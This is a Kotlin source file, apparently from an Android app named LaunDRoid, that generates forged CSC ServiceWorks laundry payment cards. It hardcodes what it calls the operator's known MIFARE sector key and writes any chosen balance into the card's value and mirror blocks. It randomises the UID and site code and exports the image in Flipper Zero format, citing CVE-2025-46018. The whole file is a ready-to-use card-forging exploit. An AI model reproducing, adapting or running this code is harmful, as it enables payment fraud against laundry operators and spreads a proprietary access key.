package com.laundr.droid.nfc

import android.util.Log

/**
 * CSC ServiceWorks Master Card data
 * This card data allows authentication on CSC laundry machines
 * Based on CVE-2025-46018 research
 */
object MasterCard {
    private const val TAG = "MasterCard"

    // CSC ServiceWorks known keys
    val CSC_KEY_A = byteArrayOf(
        0xEE.toByte(), 0xB7.toByte(), 0x06.toByte(),
        0xFC.toByte(), 0x71.toByte(), 0x4F.toByte()
    )

    val KEY_B_DEFAULT = byteArrayOf(
        0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(),
        0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()
    )

    /**
     * Generate a CSC master card with specified balance
     * @param balanceCents Balance in cents (e.g., 5000 = $50.00)
     * @param randomizeUid If true, generate random UID each time
     */
    fun generateMasterCard(balanceCents: Int = 5000, randomizeUid: Boolean = true): MasterCardData {
        val random = java.util.Random()

        val uid = if (randomizeUid) {
            // Generate random 4-byte UID
            val bytes = ByteArray(4)
            random.nextBytes(bytes)
            bytes[3] = (bytes[3].toInt() or 0x01).toByte()  // Ensure not all zeros
            bytes
        } else {
            // Default UID
            byteArrayOf(0xDB.toByte(), 0xDC.toByte(), 0xDA.toByte(), 0x74.toByte())
        }

        // Generate random site code (4 hex chars = 2 bytes)
        val siteCode = "%04X".format(random.nextInt(0xFFFF))

        // Calculate BCC (XOR of UID bytes)
        val bcc = (uid[0].toInt() xor uid[1].toInt() xor uid[2].toInt() xor uid[3].toInt()).toByte()

        val blocks = Array(64) { ByteArray(16) }

        // Block 0: UID + BCC + manufacturer data
        blocks[0] = byteArrayOf(
            uid[0], uid[1], uid[2], uid[3], bcc,
            0x08.toByte(), 0x04.toByte(), 0x00.toByte(),
            0x04.toByte(), 0xF0.toByte(), 0x35.toByte(), 0x6B.toByte(),
            0x3D.toByte(), 0xB6.toByte(), 0xE9.toByte(), 0x90.toByte()
        )

        // Block 1: CSC identification data
        blocks[1] = byteArrayOf(
            0x30, 0x30, 0x00, 0x01, 0x00, 0x00, 0x01, 0x84.toByte(),
            0x28, 0x30, 0x00, 0x00, 0x01, 0x11, 0xEE.toByte(), 0x62
        )

        // Block 2: CSC ServiceWorks signature (0x0101)
        blocks[2] = byteArrayOf(
            0x01, 0x01, 0xC5.toByte(), 0xCB.toByte(), 0xAB.toByte(), 0x70, 0x00, 0x00,
            0x00, 0x88.toByte(), 0x13, 0x01, 0x00, 0x00, 0x00, 0x4F
        )

        // Block 3: Sector 0 trailer
        blocks[3] = buildTrailer(CSC_KEY_A, 0x78, 0x77, 0x88.toByte(), KEY_B_DEFAULT)

        // Block 4: Balance (with inverted values for validation)
        val valLo = (balanceCents and 0xFF).toByte()
        val valHi = ((balanceCents shr 8) and 0xFF).toByte()
        val valInvLo = (valLo.toInt() xor 0xFF).toByte()
        val valInvHi = (valHi.toInt() xor 0xFF).toByte()
        val counter: Short = 16100  // Uses remaining (~16000-16200 range)
        val cntLo = (counter.toInt() and 0xFF).toByte()
        val cntHi = ((counter.toInt() shr 8) and 0xFF).toByte()
        val cntInvLo = (cntLo.toInt() xor 0xFF).toByte()
        val cntInvHi = (cntHi.toInt() xor 0xFF).toByte()

        blocks[4] = byteArrayOf(
            valLo, valHi, cntLo, cntHi,
            valInvLo, valInvHi, cntInvLo, cntInvHi,
            valLo, valHi, cntLo, cntHi,  // Mirror
            0x04, 0xFB.toByte(), 0x04, 0xFB.toByte()
        )

        // Blocks 5-6: Empty
        blocks[5] = ByteArray(16)
        blocks[6] = ByteArray(16)

        // Block 7: Sector 1 trailer
        blocks[7] = buildTrailer(CSC_KEY_A, 0x68, 0x77, 0x89.toByte(), KEY_B_DEFAULT)

        // Block 8: Balance mirror
        blocks[8] = blocks[4].copyOf()

        // Blocks 9-10: Empty
        blocks[9] = ByteArray(16)
        blocks[10] = ByteArray(16)

        // Block 11: Sector 2 trailer
        blocks[11] = buildTrailer(CSC_KEY_A, 0x7F, 0x07, 0x88.toByte(), KEY_B_DEFAULT)

        // Fill remaining sectors with default trailers
        for (sector in 3..15) {
            val trailerBlock = sector * 4 + 3
            blocks[trailerBlock] = buildTrailer(CSC_KEY_A, 0xFF.toByte(), 0x07, 0x80.toByte(), KEY_B_DEFAULT)
        }

        Log.i(TAG, "Generated master card with UID: ${uid.toHexString()}, balance: $${balanceCents / 100}.${String.format("%02d", balanceCents % 100)}")

        return MasterCardData(
            uid = uid.toHexString(),
            blocks = blocks,
            balanceCents = balanceCents,
            keyA = CSC_KEY_A.toHexString(),
            keyB = KEY_B_DEFAULT.toHexString(),
            siteCode = siteCode
        )
    }

    private fun buildTrailer(keyA: ByteArray, acc0: Byte, acc1: Byte, acc2: Byte, keyB: ByteArray): ByteArray {
        return byteArrayOf(
            keyA[0], keyA[1], keyA[2], keyA[3], keyA[4], keyA[5],
            acc0, acc1, acc2, 0x00,
            keyB[0], keyB[1], keyB[2], keyB[3], keyB[4], keyB[5]
        )
    }

    /**
     * Export master card to Flipper .nfc format
     */
    fun exportToFlipperFormat(card: MasterCardData): String {
        return buildString {
            appendLine("Filetype: Flipper NFC device")
            appendLine("Version: 4")
            appendLine("# Generated by LaunDRoid - CSC MasterCard")
            appendLine("# CVE-2025-46018")
            appendLine("Device type: MIFARE Classic 1K")
            appendLine("UID: ${card.uid.chunked(2).joinToString(" ")}")
            appendLine("ATQA: 00 04")
            appendLine("SAK: 08")
            appendLine("# Blocks")

            for (i in 0 until 64) {
                val blockData = card.blocks[i].joinToString(" ") { "%02X".format(it) }
                appendLine("Block $i: $blockData")
            }
        }
    }
}

data class MasterCardData(
    val uid: String,
    val blocks: Array<ByteArray>,
    val balanceCents: Int,
    val keyA: String,
    val keyB: String,
    val siteCode: String = "0000"
) {
    val balanceFormatted: String
        get() = "$${balanceCents / 100}.${String.format("%02d", balanceCents % 100)}"

    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (javaClass != other?.javaClass) return false
        other as MasterCardData
        return uid == other.uid
    }

    override fun hashCode(): Int = uid.hashCode()
}
